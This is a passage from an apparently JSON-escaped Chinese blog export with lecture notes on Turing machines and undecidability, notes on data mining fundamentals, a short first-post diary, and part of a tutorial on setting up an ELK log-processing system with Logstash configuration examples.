F)</script><ol>\n<li>$Q$：有穷状态集</li>\n<li>$\\Sigma$：有穷输入符号集</li>\n<li>$\\Gamma$：有穷带符号集，且总有$\\Sigma \\subset \\Gamma$</li>\n<li>$\\delta$：$Q \\times \\Gamma \\to Q \\times \\Gamma \\times \\lbrace L,R \\rbrace$转移函数</li>\n<li>$q_0 \\in Q$：初始状态</li>\n<li>$B \\in \\Gamma - \\Sigma$：空格符号</li>\n<li>$F \\subseteq Q$：终态集或接受状态集<span id=\"more\"></span>\n</li>\n</ol>\n<p>例1：设计识别$\\lbrace 0^n 1^n \\vert n \\geq 1 \\rbrace$的图灵机<br><img src=\"111.png\" alt=\"\"></p>\n<p>续例1：设计识别$\\lbrace 0^n 1^n \\vert n \\geq 1 \\rbrace$的图灵机</p>\n<p>$M = (\\lbrace q_0,q_1,q_2,q_3,q_4 \\rbrace, \\lbrace 0,1 \\rbrace,\\lbrace 0,1,X,Y,B \\rbrace, \\delta, q_0, B, \\lbrace q_4 \\rbrace)$<br><img src=\"112.png\" alt=\"\"></p>\n<p><strong>定义</strong>：图灵机虽然有无穷长的串，但是经过有限步，带上非空内容总是有限的，因此用全部非空符号，当前状态及带头位置，定义图灵机的瞬时描述（ID）为：</p>\n<script type=\"math/tex; mode=display\">\nX_1 X_2 \\dots X_{i-1} 1 X_i X_{i+1} \\dots X_n</script><ol>\n<li>图灵机的状态$q$</li>\n<li>带头在左起第$i$个非空格符$X_i$上</li>\n<li>$X_1 X_2 \\dots X_n$是最左到最右非空格内容</li>\n</ol>\n<p><strong>转移符号定义</strong>：图灵机$M$中，如果$\\delta(q,X_i) = (p,Y,L)$，定义$ID$转移为</p>\n<script type=\"math/tex; mode=display\">\nX_1 \\dots X_{i-1} q X_i \\dots X_n \\vdash_M X_1 \\dots X_{i-2} p X_{i-1} Y X_{i+1} \\dots X_n</script><p>如果$\\delta(q,X_i)=(p,Y,R)$，那么</p>\n<script type=\"math/tex; mode=display\">\nX_1 \\dots X_{i-1} q X_i \\dots X_n \\vdash_M X_1 \\dots X_{i-1} Y p X_{i+1} \\dots X_n</script><p>若某$ID$是从另一个经有限步（包括0步）转移而得到的，记为$\\vdash_{M}^{\\ast}$，若$M$已知，简记为$\\vdash$和$\\vdash^{\\ast}$</p>\n<p>续例1：设计识别$\\lbrace 0^n 1^n \\vert n \\geq 1 \\rbrace$的图灵机，接受0011的ID序列<br><img src=\"113.png\" alt=\"\"></p>\n<h2 id=\"语言与停机\"><a href=\"#语言与停机\" class=\"headerlink\" title=\"语言与停机\"></a>语言与停机</h2><p><strong>定义</strong>：如果$M=(Q,\\Sigma,\\Gamma,\\delta,q_0,B,F)$是一个图灵机，则$M$接受的语言为</p>\n<script type=\"math/tex; mode=display\">\n\\boldsymbol{L}(M) = \\lbrace w \\vert w \\in \\Sigma^{\\ast},q_0w \\vdash^{\\ast} \\alpha p \\beta, p \\in F, \\alpha,\\beta \\in \\Gamma^{\\ast} \\rbrace</script><p><strong>定义</strong>：如果$L$是图灵机$M$的语言，即$L=\\boldsymbol{L}(M)$，则称$L$是递归可枚举语言</p>\n<ul>\n<li>一般假定，当输入串被接受时，图灵机总会停机</li>\n<li>然而，对于不接受的输入，图灵机可能永远不会停止</li>\n</ul>\n<p><strong>定义</strong>：对接受和不接受的输入，都保证停机的图灵机，所接受的语言称为递归语言。</p>\n<p><strong>算法的形式化</strong><br>保证停机的图灵机，正是算法的好模型，即算法概念的形式化。</p>\n<h2 id=\"整数函数计算器\"><a href=\"#整数函数计算器\" class=\"headerlink\" title=\"整数函数计算器\"></a>整数函数计算器</h2><ul>\n<li>例如，将整数$i \\geq 0$表示字符串$0^i$</li>\n<li>若计算$k$个自变量$i_1,i_2,\\dots,i_k$的函数$f$，用<script type=\"math/tex; mode=display\">\n0^{i_1} 10^{i_2} 1 \\dots 10^{i_k}</script>作为TM $M$的输入</li>\n<li>当$M$停机且输入带上为$0^m$，表示计算<script type=\"math/tex; mode=display\">\nf(i_1,i_2,\\dots,i_k) = m</script></li>\n</ul>\n<p>例2：设计整数真减法(-)的图灵机</p>\n<script type=\"math/tex; mode=display\">\nm - n = \n\\begin{cases}\nm - n & m \\geq n \\\\\n0 & m \\lt n\n\\end{cases}</script><p><img src=\"114.png\" alt=\"\"></p>\n<h2 id=\"图灵机的变形\"><a href=\"#图灵机的变形\" class=\"headerlink\" title=\"图灵机的变形\"></a>图灵机的变形</h2><p><strong>状态中存储</strong><br>有限状态控制器中可以存储多个有限符号的图灵机</p>\n<script type=\"math/tex; mode=display\">\nM^{\\prime} = (Q^{\\prime},\\Sigma,\\Gamma,\\delta,q_0^{\\prime},B,F^{\\prime})</script><p>其中$Q^{\\prime} = Q \\times \\Gamma \\times \\dots \\times \\Gamma, \\ q_0^{\\prime} = [q_0,B,\\dots,B]$</p>\n<p><strong>多道</strong><br>多道图灵机：</p>\n<script type=\"math/tex; mode=display\">\nM^{\\prime} = (Q,\\Sigma,\\Gamma^{\\prime},\\delta,q_0,B^{\\prime},F)</script><p>其中$\\Gamma^{\\prime} = \\Gamma \\times \\Gamma \\times \\dots \\times \\Gamma$</p>\n<p>例子3：利用状态中存储与多道设计TM识别$L=\\lbrace wcw \\vert w \\in \\lbrace a,b \\rbrace^{\\ast} \\rbrace$<br><img src=\"115.png\" alt=\"\"></p>\n<p><strong>半无穷带图灵机</strong><br>图灵机的输入输出带只有一侧是无穷的</p>\n<p><strong>定理39</strong><br>半无穷带图灵机，与图灵机等价</p>\n<p><strong>多带图灵机</strong><br>有穷控制器，$k$个带头和$k$条带组成，每个动作，根据状态和每个带头符号：</p>\n<ul>\n<li>改变控制器中的状态</li>\n<li>修改带头单元格中的符号</li>\n<li>每个带头独立的向左或右移动一个格，或保持不动<br>开始时，输入在第一条带上，其他都是空的</li>\n</ul>\n<p><strong>定理40</strong><br>由多带图灵机接受的语言$L$，可被单带图灵机接受</p>\n<p><strong>证明</strong>：</p>\n<ol>\n<li>用$2k$道的单带图灵机$D$模拟$k$带图灵机$M$</li>\n<li>$D$用两道模拟$M$一带，一道放置内容，一道标记带头</li>\n<li>为模拟$M$的一个动作，$D$需要从左至右，再从右至左，各扫描一次</li>\n<li>第一次扫描收集各个带头处符号，第二次更新带头符号和位置</li>\n</ol>\n<h3 id=\"图灵机的运行时间\"><a href=\"#图灵机的运行时间\" class=\"headerlink\" title=\"图灵机的运行时间\"></a>图灵机的运行时间</h3><p><strong>定义</strong><br>图灵机$M$在输入$w$上的运行时间，为停机前移动的步数</p>\n<p><strong>定义</strong><br>图灵机$M$在所有长度为$n$的输入上，运行时间关于$n$的最大值函数$T(n)$，称为$M$的时间复杂度</p>\n<ul>\n<li>只有保证停机的图灵机，其时间复杂度$T(n)$才有意义</li>\n<li>但是，只有多项式把时间的$T(n)$，才是计算机上实际可解的</li>\n</ul>\n<p><strong>定理41</strong><br>单带图灵机$D$模拟$k$带图灵机$M$的$n$步移动，需要使用$O(n^2)$的时间</p>\n<p><strong>证明</strong>：</p>\n<ol>\n<li>$M$移动$n$步，带头相距不会超过$2m$</li>\n<li>而标记带头并调转方向至多需要$2k$</li>\n<li>因此$D$模拟$M$的1步至多需要$4n+2k$步，即$O(n)$时间</li>\n<li>因此模拟$n$步需要$O(n^2)$时间</li>\n</ol>\n<h3 id=\"非确定图灵机（NTM）\"><a href=\"#非确定图灵机（NTM）\" class=\"headerlink\" title=\"非确定图灵机（NTM）\"></a>非确定图灵机（NTM）</h3><p>图灵机在每组状态$q$和带符号$X$的转移$\\delta(q,X)$，可以有有限个选择：</p>\n<script type=\"math/tex; mode=display\">\n\\delta(q,X) = \\lbrace (q_1,Y_1,D_1), (q_2,Y_2,D_2),\\dots, (q_k,Y_k,D_k) \\rbrace</script><ul>\n<li>NTM接受语言的方式与NFA和PDA是类似的</li>\n<li>存在从初始ID到某接受状态$ID$的转移，其他选择可以忽略</li>\n</ul>\n<p><strong>定理42</strong>：如果$L$被非确定图灵机接受，那么$L$被图灵机接受</p>\n<p><strong>证明</strong>：</p>\n<ol>\n<li>TM $M$用控制器保存并用两条带模拟NTM $N$的动作：第1条带存储$N$未处理的$ID$，第2条带模拟$N$的带</li>\n<li>$M$将第1条带最前端的$ID$复制到第2带，若接受则停止</li>\n<li>将当前$ID$可能的$k$个转移$ID$复制到第1条带的最末端</li>\n<li>将第1带上最前端的ID抹掉，从第2步重复</li>\n</ol>\n<p><strong>证明（续）</strong></p>\n<ul>\n<li>只有$N$进入接受的$ID$时，$M$才会且一定会接受</li>\n<li>因为若$N$每步最多$m$个选择，那么从初始$ID$经过$n$步最先可到的$ID$数量为<script type=\"math/tex; mode=display\">\n 1+m+m^2+\\dots+m^n</script> 而$M$会“先广搜索”这些最多$nm^n$个的$ID$</li>\n</ul>\n<p><strong>TM与NTM</strong>  </p>\n<ul>\n<li>NTM的$n$步计算，TM需要指数倍的时间$O(m^n)$模拟，但是否必然呢？——任是未知的</li>\n<li>NTM以多项式时间解决的问题，TM是否也能以多项式时间解决呢？<script type=\"math/tex; mode=display\">\nP = NP</script></li>\n</ul>\n<h1 id=\"不可判定性\"><a href=\"#不可判定性\" class=\"headerlink\" title=\"不可判定性\"></a>不可判定性</h1><p><strong>不可判定问题</strong><br><strong>定义</strong>：一个问题，如果他的语言是递归的，称为可判定问题，否则称为不可判定问题，否则称为不可判定问题。</p>\n<ul>\n<li>递归可枚举语言 —— 图灵机所识别的语言</li>\n<li>递归语言 —— 保证停机的图灵机所识别的语言</li>\n</ul>\n<p><strong>判定问题</strong><br>“图灵机$M$接受输入$w$吗？”</p>\n<p><strong>第$i$个串</strong><br><strong>定义</strong>：将全部$(\\boldsymbol{0}+ \\boldsymbol{1})^{\\ast}$中的字符串按照长度和字典序排序，那么第$i$个串就是$w_i$，而且刚好有</p>\n<script type=\"math/tex; mode=display\">\nbinary(i) = 1w_i</script><p>即：<br><img src=\"116.png\" alt=\"\"></p>\n<p><strong>图灵机编码</strong><br>将$\\Sigma = \\lbrace 0,1 \\rbrace$上的任意图灵机$M$，用二进制字符串编码</p>\n<script type=\"math/tex; mode=display\">\nM = (Q,\\Sigma, \\Gamma, \\delta, q_1, B, F)</script><ol>\n<li>$Q=\\lbrace q<em>1,q_2,\\dots,q</em>{\\vert Q \\vert} \\rbrace$，开始状态$q_1$，终态为$q_2$且停机</li>\n<li>$\\Gamma = \\lbrace X<em>1,X_2,\\dots,X</em>{\\vert \\Gamma \\vert} \\rbrace$，总有$X_1=0,X_2=1,X_3=B$</li>\n<li>设带头移动方向$D_1=L,\\ D_2=R$</li>\n<li>任意的转移$\\delta(q_i,X_j)=(q_k,X_l,D_m)$编码为<script type=\"math/tex; mode=display\">\nC=0^i10^j10^k10^l10^m</script></li>\n<li>则全部$n$个转移的编码合并在一起，作为图灵机$M$的编码<script type=\"math/tex; mode=display\">\nC_1 11 C_2 11 \\dots C_{n-1} 11 C_n</script></li>\n</ol>\n<p><strong>第$i$个图灵机$M_i$</strong><br><strong>定义</strong>：当图灵机$M$的编码为$w_i$时，则称其为第$i$个图灵机$M_i$</p>\n<ul>\n<li>那么，任意图灵机$M$，都对应于一个字符串$w$</li>\n<li>而任意字符串$w$，也都可以看作是一个图灵机$M$</li>\n<li>当$w$的编码不合法时，则将其看作仅仅接受$\\emptyset$且立即停机的图灵机</li>\n</ul>\n<h2 id=\"非递归可枚举的语言\"><a href=\"#非递归可枚举的语言\" class=\"headerlink\" title=\"非递归可枚举的语言\"></a>非递归可枚举的语言</h2><p><strong>定义</strong>：对角化语言$L_{d}=\\lbrace w_i \\vert w_i \\not\\in \\boldsymbol{L}(M_i),i \\geq 1 \\rbrace$<br><img src=\"117.png\" alt=\"\"></p>\n<p><strong>定理44</strong>：对角化语言$L_d$不是递归可枚举的</p>\n<p><strong>证明</strong>：假设存在识别$L_d$的图灵机$M$，那么$M$也可被编码，不妨设它是第$i$个图灵机$M_i=M$，即$\\boldsymbol{L}(M_i)=L_d$，那么，考虑第$i$个串$w_i$是否会被$M_i$识别：</p>\n<ol>\n<li>如果$w_i \\in \\boldsymbol{L}(M_i) = L_d$，那么由$L_d$的定义，有$w_i \\not\\in \\boldsymbol{L}(M_i)$</li>\n<li>如果$w_i \\in \\boldsymbol{L}(M_i)$，那么由$L_d$的定义，又有$w_i \\in L_d = \\boldsymbol{L}(M_i)$</li>\n</ol>\n<p>无论如何都会矛盾，因此假设不成立，不存在接受$L_d$的图灵机。</p>\n<h2 id=\"递归可枚举但非递归的语言\"><a href=\"#递归可枚举但非递归的语言\" class=\"headerlink\" title=\"递归可枚举但非递归的语言\"></a>递归可枚举但非递归的语言</h2><p><strong>定义</strong>：图灵机$M$和输入串$w$组成的有序对$(M,w)$可编码为</p>\n<script type=\"math/tex; mode=display\">\nM111w</script><p><strong>定义</strong>：通用语言$L_u = \\lbrace M111w \\vert w \\in \\boldsymbol{L}(M) \\rbrace$</p>\n<p><strong>定理47</strong>：通用语言$L_u$不是递归的</p>\n<p><strong>证明</strong>：假设存在算法$A$识别$L_u$，则可构造识别$L_d$的算法$B$，将$B$的输入$w=w_i$转换为$M_u111w_i$交给$A$判断</p>\n<ul>\n<li>当$A$接受，表示$w_i \\in \\boldsymbol{L}(M_i)$，则$B$拒绝</li>\n<li>当$A$拒绝，表示$w_i \\in \\boldsymbol{L}(M_i)$，则$B$接受</li>\n</ul>\n<p>由于$L_d$不是递归的，所以$B$不可能存在，所以$L_u$不可能是递归的。</p>\n<p><strong>定理48</strong>：通过语言$L_u$是可枚举的</p>\n<p><strong>证明</strong>：构造图灵机$U$，当输入$M111w$时，用3条带模拟$M$处理串$w$的过程</p>\n<ol>\n<li>第1带装载$M$的编码</li>\n<li>第2带模拟$M$的带，放置串$w$</li>\n<li>第3带存储$M$的状态</li>\n</ol>\n<p><strong>通用图灵机</strong><br><strong>定义</strong>：可以模拟任意图灵机$M$的图灵机$U$，称为通用图灵机</p>\n<ul>\n<li>冯、诺伊曼通用电子计算机体系结构设计思想的灵感来源</li>\n<li>抽象理论的先期发展，可以对实际问题有很大帮助</li>\n</ul>\n<p>罗杰·彭罗斯在《皇帝新脑》中以另一种编码给出了 $U = Mi$ 的 $i$ 为:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">724485533533931757719839503961571123795236067255655963110814479660650505940424109031048361363235936564444345838222688327876762655614469281411771501784255170755408565768975334635694247848859704693472573998858228382779529468346052106116983594593879188554632644092552550582055598945189071653741489603309675302043155362503498452983232065158304766414213070881932971723415105698026273468642992183817215733348282307345371342147505974034518437235959309064002432107734217885149276079759763441512307958639635449226915947965461471134570014504816733756217257346452273105448298078496512698878896456976090663420447798902191443793283001949357096392170390483327088259620130177372720271862591991442827543742235135567513408422229988937441053430547104436869587640517812801943753081387063994277282315642528923751456544389905278079324114482614235728619311833261065612275553181020751108533763380603108236167504563585216421486954234718742643754442879006248582709124042207653875426445413345174856629157429990950262300973373813772416217274772361020678685400289356608569682262014198248621698902609130940298570600174300670086896759034473417412787425581201549366393899690581773859165405535670409282133222163141097871081459978669599704509681841906299443656015145490488092208448003482249207730403043188429899393135266882349662101947161910701461968523192847482034495897709553561107027581748733327296678998798473284098190764851272631001740166787363477605857245036964434897992034489997455662402937487668839751404451665707750060513883991668814072545544665222050724262392379211525318162512536305931728631422004064571305275802307665183351995689139748137504926429605010013651980186945639498</span><br></pre></td></tr></table></figure></p>\n","categories":["形式语言与自动机理论"],"tags":["形式语言与自动机理论"]},{"title":"数据挖掘","url":"/2018/11/01/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/","content":"<h3 id=\"概要\"><a href=\"#概要\" class=\"headerlink\" title=\"概要\"></a>概要</h3><p>定义：从现有的大量数据中，撷取不明显、之前未知、可能有用的信息</p>\n<p>目标：</p>\n<ul>\n<li>建立起决策模型</li>\n<li>根据过去的行动来预测未来的行为</li>\n</ul>\n<p>数据挖掘—从大量数据中寻找其规律的技术，是统计学、数据库技术和人工智能技术的综合。数据挖掘是从数据中自动地抽取模式、关联、变化、异常和有意义的结构；数据挖掘大部分的价值在于利用数据挖掘技术改善预测模型。</p>\n<p>模型（Model） vs 模式（Pattern）</p>\n<ul>\n<li>数据挖掘的根本目的就是把样本数据中隐含的结构泛化（Generalize）到总体（Population）上去</li>\n<li>模型：对数据集的一种全局性的整体特征的描述或概括，适用于数据空间中的所有点，例如聚类分析</li>\n<li>模式：对数据集的一种局部性的有限特征的描述或概括，适用于数据空间的一个子集，例如关联分析</li>\n</ul>\n<p>算法（Algorithm）：一个定义完备（well-defined）的过程，它以数据作为输入并产生模型或模式形式的输出<br><span id=\"more\"></span></p>\n<p>描述型挖掘（Descriptive） vs 预测型挖掘（Predictive）</p>\n<ul>\n<li>描述型挖掘：对数据进行概括，以方便的形式呈现数据的重要特征</li>\n<li>预测型挖掘：根据观察到的对象特征值来预测它的其他特征值</li>\n<li>描述型挖掘可以是目的，也可以是手段</li>\n</ul>\n<p>数据挖掘 = 模型 + 算法</p>\n<ul>\n<li>分类预测<ul>\n<li>Logistic Regression</li>\n<li>决策树</li>\n<li>神经网络</li>\n</ul>\n</li>\n<li>关联规则<ul>\n<li>Apriori</li>\n<li>FP-Growth</li>\n</ul>\n</li>\n<li>聚类<ul>\n<li>K-Means</li>\n<li>K-Mode</li>\n<li>SOM（自组织图）</li>\n</ul>\n</li>\n<li>孤立点检测<ul>\n<li>基于统计</li>\n<li>基于距离</li>\n<li>基于偏差</li>\n</ul>\n</li>\n</ul>\n<p>关联规则的量度</p>\n<ul>\n<li>支持度：Support(A=&gt;B)=#AB/#N，表示A和B同时出现的概率 P(X∩Y) </li>\n<li>期望可信度：Support(A)=#A/#N，表示A出现的概率 P(Y)</li>\n<li>置信度：Confidence(A=&gt;B)=Support(A=&gt;B)/Support(B) P(Y|X) </li>\n<li>改善度：Lift(A=&gt;B)=Confidence(A=&gt;B)/Support(B) P(Y|X)/P(Y) </li>\n</ul>\n<p>数据挖掘的主要方法：</p>\n<ul>\n<li>分类（Classification）</li>\n<li>聚类(Clustering)</li>\n<li>相关规则(Association Rule)</li>\n<li>回归(Regression)</li>\n<li>其他</li>\n</ul>\n<h2 id=\"数据仓库\"><a href=\"#数据仓库\" class=\"headerlink\" title=\"数据仓库\"></a>数据仓库</h2><p>定义：数据仓库是为支持管理决策建立的，面向主题的、集成的、随时间变化的、不可修改的数据集合</p>\n<p>主要内容：</p>\n<ul>\n<li>ETL工具</li>\n<li>数据仓库建模</li>\n<li>联机分析</li>\n</ul>\n<p>数据对象</p>\n<h3 id=\"数据集\"><a href=\"#数据集\" class=\"headerlink\" title=\"数据集\"></a>数据集</h3><p>数据集由数据对象组成。一个数据对象代表一个实体(entity)。数据对象又称为样本、实例、数据点、或对象。数据对象用属性(attribute)描述。数据行对应数据对象，列对应属性。</p>\n<h3 id=\"属性\"><a href=\"#属性\" class=\"headerlink\" title=\"属性\"></a>属性</h3><p>属性(attribute)是一个数据字段，表示数据对象的一个特征。如：customer _ID, name,address<br>类型:</p>\n<ul>\n<li>标称属性(nominal)：其值是一些符号或者事物的名称。头发颜色= {黑色，棕色，灰色，白色}</li>\n<li>二元属性(binary)：是一种标称属性，只有两个状态：0或1。又根据两种状态具有同等价值，携带相同权重分为对称和非对称属性。</li>\n<li>序数属性(ordinal)：其可能的值之间具有有意义的序或者秩评定(ranking)，但是相继值之间的差是未知的。成绩={优，良，中，差}</li>\n<li>数值属性(numeric)<ul>\n<li>区间标度属性(interval-scaled)：使用相等的单位尺度度量。值有序，可以评估值之间的差，不能评估倍数。没有绝对的零点。例如:摄氏温度，华氏温度</li>\n<li>比率标度属性(ratio-scaled)：具有固定零点的数值属性。值有序，可以评估值之间的差，也可以说一个值是另一个的倍数。例如：开式温温标(K)，重量，高度，速度</li>\n</ul>\n</li>\n<li>离散属性(discrete Attribute)：具有有限或者无限可数个值。如： 邮编、省份数目具有有限个值，customer_Id是无限可数的。可以用或者不用整数表示。</li>\n<li>连续属性(Continuous Attribute)：属性值为实数。一般用浮点变量表示。</li>\n</ul>\n<p><strong>注意：标称、二元和序数属性都是定性的，即只描述对象的特征，不给出实际的大小。</strong></p>\n<h2 id=\"数据的基本统计描述\"><a href=\"#数据的基本统计描述\" class=\"headerlink\" title=\"数据的基本统计描述\"></a>数据的基本统计描述</h2><ul>\n<li>目的<ul>\n<li>更好地识别数据的性质，把握数据全貌: 中心趋势度量，数据散布</li>\n</ul>\n</li>\n<li>中心趋势度量(measures of central tendency)<ul>\n<li>均值、中位数、众数、中列数</li>\n<li>对于适度倾斜（非对称的）的单峰频率曲线，可以使用以下经验公式计算众数度量中心趋势<code>mean − mode = 3(mean − median)</code></li>\n</ul>\n</li>\n<li>数据的散布(dispersion of the data)<ul>\n<li>极差、四分位数极差、五数概括、盒图</li>\n</ul>\n</li>\n<li>数据可视化(graphic displays of basic statistical descriptions)<ul>\n<li>分位数图、分位数-分位数图、直方图、散点图</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"度量的分类\"><a href=\"#度量的分类\" class=\"headerlink\" title=\"度量的分类\"></a>度量的分类</h2><p>度量可以分为三类：</p>\n<ul>\n<li>分布式度量(distributive measure)：将函数用于n个聚集值得到的结果和将函数用于所有数据得到的结果一样<ul>\n<li>比如：count()，sum()，min()，max()等</li>\n</ul>\n</li>\n<li>代数度量(algebraic)：可以通过在一个或多个分布式度量上应用一个代数函数而得到<ul>\n<li>比如：平均值函数avg() (avg() =sum()/count())</li>\n</ul>\n</li>\n<li>整体度量(holistic)：必须对整个数据集计算的度量<ul>\n<li>比如：median()，mode()，rank()度</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"度量数据的离散度\"><a href=\"#度量数据的离散度\" class=\"headerlink\" title=\"度量数据的离散度\"></a>度量数据的离散度</h2><p>最常用度量：极差、五数概括（基于四分位数）、中间四分位数极差和标准差</p>\n<ul>\n<li>极差（range）：数据集的最大值和最小值之差</li>\n<li>百分位数(percentile)：第k个百分位数是具有如下性质的值x：k%的数据项位于或低于x</li>\n<li>中位数就是第50个百分位数</li>\n<li>四分位数：Q1(25th percentile), Q3(75th percentile)</li>\n<li>中间四分位数极差(IQR)： IQR = Q3 – Q1</li>\n<li>孤立点：通常我们认为：挑出落在至少高于第三个四分位数或低于第一个四分位数 1.5×IQR处的值</li>\n<li>五数概括: min, Q1, Median, Q3, max</li>\n<li>盒图：数据分布的一种直观表示，端点在四分位数上，使得盒图的长度是IQR，中位数M用盒内的线标记，胡须延伸到最大最小观测值</li>\n<li>方差和标准差</li>\n<li>离群点 Outlier: 第三个四分位数之上或者第一个四分位数之下至少1.5 x IQR的值</li>\n</ul>\n<h2 id=\"数据预处理\"><a href=\"#数据预处理\" class=\"headerlink\" title=\"数据预处理\"></a>数据预处理</h2><p>度量数据的质量：</p>\n<ul>\n<li>精确度</li>\n<li>完整度</li>\n<li>一致性</li>\n<li>合乎时机</li>\n<li>可信度</li>\n<li>附加价值</li>\n<li>可解释性</li>\n</ul>\n<p>数据清理</p>\n<ul>\n<li>填写空缺的值，平滑噪声数据，识别、删除孤立点，解决不一致性</li>\n<li>数据集成</li>\n<li>集成多个数据库、数据立方体或文件</li>\n<li>数据变换</li>\n<li>规范化和聚集</li>\n<li>数据归约</li>\n<li>得到数据集的压缩表示，它小得多，但可以得到相同或相近的结果</li>\n<li>数据离散化</li>\n<li>数据归约的一部分，通过概念分层和数据的离散化来规约数据， 对数字型数据特别重要</li>\n</ul>\n","tags":["大数据"]},{"title":"新纪元","url":"/2017/10/01/%E6%96%B0%E7%BA%AA%E5%85%83/","content":"<p>为了迎接软件8周后三个实验课的恶竞，准备提前学一点前端。一学期前听学长讲起前端看到一个百度主页几千行的代码感觉这东西与我无缘，便产生了生生恐惧感。如今，有了队内巨佬的指导，一个星期算是进步神速了。一个星期前还是只会用网页输出‘Hello World’，如今已经学会html基本语法，了解了css和js，会用bootstrap的简单框架。  </p>\n<p>盘点一下这个星期达成的成就吧：  </p>\n<ol>\n<li>学会了配置CentOS  </li>\n<li>买了vultr境外主机，搭建ss服务器  </li>\n<li>顺带着发现hexo这块新大陆，开通了自己的个人博客  </li>\n</ol>\n<p>似乎大一所有人都在玩。有的玩的是Linux，服务器，算法，有的人玩的是王者荣耀。于是，当我沉迷于排位的时候，差距就如此拉开了。然而现在转眼一看，其实网络技术好像比moba好玩多了啊。</p>\n<p>第一篇文章，一个新的纪元。</p>\n<p>一周的小小成果：</p>\n<ul>\n<li>Paste: <a href=\"http://paste.xuranus.com\">http://paste.xuranus.com</a></li>\n<li>Blog: <a href=\"http://blog.xuranus.com\">http://blog.xuranus.com</a></li>\n<li>HomePage: <a href=\"http://xuranus.com\">http://xuranus.com</a></li>\n</ul>\n","tags":["一点牢骚"]},{"title":"日志处理系统的搭建","url":"/2021/04/22/%E6%97%A5%E5%BF%97%E5%A4%84%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%90%AD%E5%BB%BA/","content":"<p>服务运行的过程中就会不断产生日志，日志的常见用途有：</p>\n<ul>\n<li>查看某个时间段的错误原因</li>\n<li>分析某个接口的召回率</li>\n<li>记录接口的输入输出参数，在升级接口的时候做回归测试</li>\n</ul>\n<p>对于单点服务的日志只需要用<code>awk</code>，<code>grep</code>命令即可获取需要的信息，但在分布式系统中，管理分布在各个节点的日志就会变得很麻烦，需要有一个系统采集各个节点的日志几种储存。</p>\n<span id=\"more\"></span>\n<h2 id=\"ELK\"><a href=\"#ELK\" class=\"headerlink\" title=\"ELK\"></a>ELK</h2><p>ELK提供了一套完整的解决方案，它是三个开源软件的缩写：</p>\n<ul>\n<li>E：ElasticSearch（数据仓库）</li>\n<li>L：Logstash</li>\n<li>K：kibana（图形化展示）</li>\n</ul>\n<p>ElasticSearch是一个分布式搜索引擎，提供搜集、分析、存储数据的功能。它的特点有：分布式，零配置，自动发现，索引自动分片，索引副本机制，restful风格接口，多数据源，自动搜索负载等。</p>\n<p>Logstash 主要是用来日志的搜集、分析、过滤日志的工具，支持大量的数据获取方式。一般工作方式为c/s架构，client端安装在需要收集日志的主机上，server端负责将收到的各节点日志进行过滤、修改等操作在一并发往ElasticSearch上去。</p>\n<p>Kibana可以为Logstash和ElasticSearch提供的日志分析友好的Web界面，可以帮助汇总、分析和搜索重要数据日志。</p>\n<p>除了ELK之外，还需要依赖分布在各个节点上的日志采集端：Beat。目前Beats包含四种工具：</p>\n<ul>\n<li>Packetbeat（搜集网络流量数据）</li>\n<li>Topbeat（搜集系统、进程和文件系统级别的CPU和内存使用情况等数据）</li>\n<li>Filebeat（搜集文件数据）</li>\n<li>Winlogbeat（搜集Windows事件日志数据）</li>\n</ul>\n<p><strong>工作流程</strong>：<br>Logstash监听5044端口，日志采集节点（Beat）向Logstash发送日志，Logstash将接受到的日志根据部分规则解析，提取目标信息，转化成JSON，发送到ES的9200端口。ES接收到数据后存储，由Kibana做可视化展示。</p>\n<p>整套ELK组件都可以在Elastic官网的<a href=\"https://www.elastic.co/cn/downloads/\">下载页</a>下载。</p>\n<p>安装后，进入各个组件的<code>bin</code>目录下依次启动ES，Kibana，Logstash，Beat：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./elasticsearch # 启动elasticsearch</span><br><span class=\"line\">./kibana # 启动kibana</span><br></pre></td></tr></table></figure>\n<p>检查ES的状态：<br><img src=\"2.png\" alt=\"\"></p>\n<p>Logstash的启动需要指定配置文件：<code>logstash -f ../config/logstash-sample.conf</code>。配置文件<code>logstash-sample.conf</code>的格式如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">input &#123;</span><br><span class=\"line\">  beats &#123;</span><br><span class=\"line\">    port =&gt; 5044</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">output &#123;</span><br><span class=\"line\">  elasticsearch &#123;</span><br><span class=\"line\">    hosts =&gt; [&quot;http://localhost:9200&quot;]</span><br><span class=\"line\">    index =&gt; &quot;%&#123;[@metadata][beat]&#125;-%&#123;[@metadata][version]&#125;-%&#123;+YYYY.MM.dd&#125;&quot;</span><br><span class=\"line\">    #user =&gt; &quot;elastic&quot;</span><br><span class=\"line\">    #password =&gt; &quot;changeme&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>input</code>中声明Logstash监听5044端口，接收来自Beats的日志。<code>output</code>中说明将处理过的日志输出到ElasticSearch。其中ElasticSearch的配置和数据库的对应关系如下：</p>\n<ul>\n<li><code>index</code>：数据库</li>\n<li><code>type</code>：表</li>\n<li><code>document</code>：一条数据</li>\n</ul>\n<p>初始的配置没有配置<code>filter</code>，此时Logstash起到的作用是直接转发，相当于Beat的数据不经处理直接到ElasticSearch。Logstash发挥的作用必须通过配置<code>filter</code>实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">filter &#123;</span><br><span class=\"line\">    grok &#123;</span><br><span class=\"line\">        match =&gt; &#123;</span><br><span class=\"line\">            &quot;message&quot; =&gt; &quot;(?&lt;name&gt;\\w+)_(?&lt;age&gt;\\d+)_(?&lt;job&gt;\\w+)&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以用<a href=\"http://grokdebug.herokuapp.com/\">grok debugg</a>来测试grok配置的生成效果。</p>\n<p><code>(?&lt;name&gt;\\w+)_(?&lt;age&gt;\\d+)_(?&lt;job&gt;\\w+)</code>可以将”thankod_24_student”解析成JSON对象：<br><img src=\"3.png\" alt=\"\"></p>\n<p>检查Logstash状态：<br><img src=\"1.png\" 